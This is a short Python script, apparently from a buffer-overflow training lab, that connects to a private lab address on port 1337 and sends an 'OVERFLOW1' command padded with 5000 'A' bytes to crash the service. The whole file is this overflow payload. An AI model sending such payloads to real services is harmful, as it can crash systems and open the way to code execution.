#!/usr/bin/env python3
import socket
import struct

host, port = '10.10.57.175', 1337
command = b'OVERFLOW1 '
payload = b''.join(
        [
        command,
        b'A' * 5000,

        ])
with socket.socket() as s:
        s.connect((host, port))
        s.send(payload)

